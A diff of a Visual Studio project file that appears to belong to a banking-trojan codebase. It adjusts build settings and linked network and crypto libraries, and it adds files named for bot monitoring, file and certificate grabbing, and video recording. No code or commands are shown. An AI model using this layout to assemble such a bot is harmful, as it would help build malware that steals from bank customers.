@@ -43,12 +43,13 @@
 				Optimization="0"
 				AdditionalIncludeDirectories="..\..\Source\RuBnk;..\..\Source\Misc;..\..\Source\Common;..\..\Source\Core;..\..\Source;..\..\Include;Modules"
 				PreprocessorDefinitions="WIN32;_DEBUG;_WINDOWS;DEBUGBOT"
+				StringPooling="false"
 				MinimalRebuild="true"
 				BasicRuntimeChecks="3"
 				RuntimeLibrary="3"
 				UsePrecompiledHeader="0"
 				WarningLevel="3"
-				DebugInformationFormat="4"
+				DebugInformationFormat="0"
 				OmitDefaultLibName="false"
 			/>
 			<Tool
@@ -62,6 +63,7 @@
 			/>
 			<Tool
 				Name="VCLinkerTool"
+				AdditionalDependencies="..\..\source\lib\ntdll.lib shlwapi.lib Ws2_32.lib urlmon.lib Crypt32.lib ..\..\source\lib\winsta.lib Wininet.lib gdiplus.lib Iphlpapi.lib"
 				LinkIncremental="2"
 				GenerateDebugInformation="true"
 				SubSystem="2"
@@ -121,6 +123,7 @@
 				WholeProgramOptimization="false"
 				AdditionalIncludeDirectories="..\..\Source\RuBnk;..\..\Source\Misc;..\..\Source\Common;..\..\Source\Core;..\..\Source;..\..\Include;Modules"
 				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;BOTRELEASE"
+				StringPooling="false"
 				ExceptionHandling="0"
 				RuntimeLibrary="2"
 				BufferSecurityCheck="false"
@@ -142,7 +145,7 @@
 			/>
 			<Tool
 				Name="VCLinkerTool"
-				AdditionalDependencies="..\..\Source\Lib\exsup.lib libcmt.lib"
+				AdditionalDependencies="..\..\source\lib\ntdll.lib shlwapi.lib Ws2_32.lib urlmon.lib Crypt32.lib ..\..\source\lib\winsta.lib Wininet.lib gdiplus.lib Iphlpapi.lib"
 				LinkIncremental="1"
 				GenerateManifest="false"
 				GenerateDebugInformation="false"
@@ -206,6 +209,7 @@
 				WholeProgramOptimization="false"
 				AdditionalIncludeDirectories="..\..\Source\RuBnk;..\..\Source\Misc;..\..\Source\Common;..\..\Source\Core;..\..\Source;..\..\Include;Modules"
 				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;DEBUGBOT"
+				StringPooling="false"
 				ExceptionHandling="0"
 				RuntimeLibrary="2"
 				BufferSecurityCheck="false"
@@ -227,6 +231,7 @@
 			/>
 			<Tool
 				Name="VCLinkerTool"
+				AdditionalDependencies="..\..\source\lib\ntdll.lib shlwapi.lib Ws2_32.lib urlmon.lib Crypt32.lib ..\..\source\lib\winsta.lib Wininet.lib gdiplus.lib Iphlpapi.lib"
 				LinkIncremental="1"
 				GenerateManifest="false"
 				GenerateDebugInformation="false"
@@ -263,7 +268,7 @@
 			OutputDirectory="..\Bin\$(ConfigurationName)"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="1"
-			CharacterSet="0"
+			CharacterSet="2"
 			WholeProgramOptimization="0"
 			>
 			<Tool
@@ -290,7 +295,7 @@
 				WholeProgramOptimization="false"
 				AdditionalIncludeDirectories="..\..\Source\RuBnk;..\..\Source\Misc;..\..\Source\Common;..\..\Source\Core;..\..\Source;..\..\Include;Modules"
 				PreprocessorDefinitions="NDEBUG;DEBUGCONFIG"
-				StringPooling="true"
+				StringPooling="false"
 				ExceptionHandling="0"
 				RuntimeLibrary="2"
 				BufferSecurityCheck="false"
@@ -358,7 +363,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\RuBnk\Avangard.h"
+				RelativePath="..\..\Source\RuBnk\Avangard.h"
 				>
 			</File>
 			<File
@@ -410,6 +415,18 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\Source\Common\BotMonitor.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\Source\Common\BotMonitorConsts.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\Source\Common\BotMonitorMsg.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotUtils.h"
 				>
 			</File>
@@ -422,11 +439,15 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\Source\RuBnk\CabPacker.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Misc\CertGrab.h"
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Misc\CmdLine.h"
+				RelativePath="..\..\Source\Misc\CmdLine.h"
 				>
 			</File>
 			<File
@@ -470,7 +491,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\FileGrabber.h"
+				RelativePath="..\..\Source\Common\FgrFilters.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\Source\Common\FileGrabber.h"
 				>
 			</File>
 			<File
@@ -586,7 +611,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\Pipes.h"
+				RelativePath="..\..\Source\Common\Pipes.h"
 				>
 			</File>
 			<File
@@ -738,6 +763,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\Source\Common\BotMonitor.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotUtils.cpp"
 				>
 			</File>
@@ -754,7 +783,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Misc\CmdLine.cpp"
+				RelativePath="..\..\Source\Misc\CmdLine.cpp"
 				>
 			</File>
 			<File
@@ -794,7 +823,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\FileGrabber.cpp"
+				RelativePath="..\..\Source\Common\FgrFilters.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\Source\Common\FileGrabber.cpp"
 				>
 			</File>
 			<File
@@ -835,10 +868,6 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\imbicili.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\RuBnk\Inist.cpp"
 				>
 			</File>
 			<File
@@ -894,15 +923,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\Pipes.cpp"
+				RelativePath="..\..\Source\Common\Pipes.cpp"
 				>
 			</File>
 			<File
 				RelativePath="..\..\Source\Core\Plugins.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\Poker.cpp"
 				>
 			</File>
 			<File
@@ -971,6 +996,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\VideoRecorder.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\Source\Common\VideoRecorderDll.cpp"
 				>
 			</File>
 			<File
